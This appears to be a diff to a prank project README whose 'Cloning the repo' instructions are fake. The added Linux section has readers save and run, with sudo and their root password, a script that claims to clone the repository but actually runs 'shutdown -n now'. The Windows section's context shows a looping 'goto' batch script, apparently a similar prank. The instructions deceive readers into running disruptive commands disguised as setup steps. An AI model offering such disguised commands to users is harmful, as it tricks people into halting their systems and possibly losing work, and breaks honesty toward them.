@@ -9,8 +9,7 @@ Features
 # Building
 1. Try not to die of cringe
 
-# Cloning the repo
-Note: this only works on windows
+# Cloning the repo - Windows
 1. Open notepad
 2. Write the following lines:
 ```
@@ -21,3 +20,15 @@ goto poop
 ```
 3. Save the file as `clone_repo.bat`
 4. Run `clone_repo.bat` by double-clicking it
+
+# Cloning the repo - Linux
+1. Open a text editor such as nano or touch
+2. Write the following lines:
+```
+echo this will definitely clone the repo
+shutdown -n now
+```
+3. Save the file as `clone_repo.sh`
+4. Run `chmod +X clone_repo.sh`
+5. Run `sudo ./clone_repo.sh`
+6. Type in your root password and watch it do magic
